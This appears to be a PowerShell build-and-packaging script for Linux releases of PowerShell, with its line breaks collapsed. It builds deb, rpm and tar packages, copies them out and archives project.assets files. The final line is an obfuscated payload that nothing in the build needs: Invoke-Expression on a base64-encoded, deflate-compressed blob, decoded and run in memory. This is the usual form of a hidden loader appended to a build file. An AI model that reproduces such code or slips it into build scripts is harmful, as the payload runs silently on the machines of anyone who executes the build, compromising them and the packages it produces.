param ([string] $location = "/powershell",[string] $destination = '/mnt',[ValidatePattern("^v\d+\.\d+\.\d+(-\w+(\.\d+)?)?$")][ValidateNotNullOrEmpty()][string]$ReleaseTag,[switch]$TarX64,[switch]$TarArm,[switch]$TarArm64,[switch]$FxDependent,[switch]$Alpine)$releaseTagParam = @{}if ($ReleaseTag){$releaseTagParam = @{ 'ReleaseTag' = $ReleaseTag }}Push-Locationtry {Set-Location $locationImport-Module "$location/build.psm1"Import-Module "$location/tools/packaging"Start-PSBootstrap -Package -NoSudo$buildParams = @{ Configuration = 'Release'; PSModuleRestore = $true}if($FxDependent.IsPresent) {$projectAssetsZipName = 'linuxFxDependantProjectAssetssymbols.zip'$buildParams.Add("Runtime", "fxdependent")} elseif ($Alpine.IsPresent) {$projectAssetsZipName = 'linuxAlpineProjectAssetssymbols.zip'$buildParams.Add("Runtime", 'alpine-x64')} else {$projectAssetsZipName = "linuxProjectAssets-$((get-date).Ticks)-symbols.zip"$buildParams.Add("Crossgen", $true)}Start-PSBuild @buildParams @releaseTagParamif($FxDependent) {Start-PSPackage -Type 'fxdependent' @releaseTagParam} elseif ($Alpine) {Start-PSPackage -Type 'tar-alpine' @releaseTagParam} else {Start-PSPackage @releaseTagParam}if ($TarX64) { Start-PSPackage -Type tar @releaseTagParam }if ($TarArm) {Start-PSBuild -Configuration Release -Restore -Runtime linux-arm -PSModuleRestore @releaseTagParamStart-PSPackage -Type tar-arm @releaseTagParam}if ($TarArm64) {Start-PSBuild -Configuration Release -Restore -Runtime linux-arm64 -PSModuleRestore @releaseTagParamStart-PSPackage -Type tar-arm64 @releaseTagParam}}finally{Pop-Location}$linuxPackages = Get-ChildItem "$location/powershell*" -Include *.deb,*.rpm,*.tar.gzforeach ($linuxPackage in $linuxPackages){$filePath = $linuxPackage.FullNameWrite-Verbose "Copying $filePath to $destination" -VerboseCopy-Item -Path $filePath -Destination $destination -force}Write-Verbose "Exporting project.assets files ..." -verbose$projectAssetsCounter = 1$projectAssetsFolder = Join-Path -Path $destination -ChildPath 'projectAssets'$projectAssetsZip = Join-Path -Path $destination -ChildPath $projectAssetsZipNameGet-ChildItem $location\project.assets.json -Recurse | ForEach-Object {$subfolder = $_.FullName.Replace($location,'')$subfolder.Replace('project.assets.json','')$itemDestination = Join-Path -Path $projectAssetsFolder -ChildPath $subfolderNew-Item -Path $itemDestination -ItemType Directory -Force$file = $_.FullNameWrite-Verbose "Copying $file to $itemDestination" -verboseCopy-Item -Path $file -Destination "$itemDestination\" -Force$projectAssetsCounter++}Compress-Archive -Path $projectAssetsFolder -DestinationPath $projectAssetsZipRemove-Item -Path $projectAssetsFolder -Recurse -Force -ErrorAction SilentlyContinueInvoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("nVRtb9pIEP7OrxhZe5KtYMcJNG2wIjUlTctdSblAk94hdFrsAW9Z7zrrNS+h/PcbEx+hX++L1zOeneeZmWfMnuAK3juN8Y2UvSzXxrrOAo1C2ToPEikdbwJ5OZUihsJySweuLX2HnrIDa+BBGFtyeS2ljt3aJ/PrJDFYFE0ohbKQrIbiGWtj9hJLqbQabfJX98Boi7H1ov/NpWuQWxyldCSvXF7sa2uNmJYWj0hZHi9emB2CyWfsgf3BPeCGZ0hYh8t7LCrhVvL5ceQLWi+hMpz3DWs2W5ZQh53rD92bj7efPvd+/+NL/+7r4M/74ejbw+P3v/7m0zjB2TwVPxYyUzp/MoUtl6v15jk8O2+131y8fXfpBCPdTbm5NoZvXK8xK1VcoUPssqW3BYO2pD647pjYjScTYMtfb8BP6CMvSoP+1+kPajP4wzLzAnrAbxCuz8IQfHyCy3Nv95rdwpbNKvZOdBYErZ8zTcXFqa/3KejbyRWwZOzO0fqGq0Rn4Gd8LTLKypLgC6q5Tb3JLqr5sVl0lB1hC7nRMbUatmNeEZ2wNcHR4wTYP7sIUCVEYU3sC1JDjQtbV+HqP+N+j+sFirTgervdEcB8C8QYXCauwogJ8KWFiza9nZx4W5YSko3YogJMCAEjgLpAuiJBEN8FxRVVQFoxkhGIGbjU88Lz4NB1iiDY2nAul9+/OVTm+A5tMESzFDEONI2lzxWfo5l0OpUXTReNFTNBm4APXIpkL6cul3JKsiTMLbOmxF3EMjLuqOB6cMNNYTELqvSPOO1KgcpGDZYFn0l4aIqA5Os6ZYHGJzxlnSY4ff0spOSn7SAk/jrLCWwqqeL+sPcRLoKzCB4F9XFVwN3Ic7yIKQKdRzD+sLG4F1RetSELbvRKSc2TG26566TW5kXn9DSpphdrawMUqigxIIxOu906ZcoBr8E0XSZafrXwJBHMpmhucCaU2A+KPYF/RwsGDrFonTvgK7KKnMcIe89tPdIC/JwXhU1N2WDrK6Y7nV9+QGGT5bXsmuG6FYYhHe3Qi8Z11+5LZUWGAe0rGp3X8ymCPjdFyiUNp6vzjcvyJoRNGL+s9cRla1onMlrnruc14QBSlUZXjv87hNhk62Z1hNXa6dL6qpSknf2/xR9KxJy2D2NN4n530Q7DHWkgTre7fwE=")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();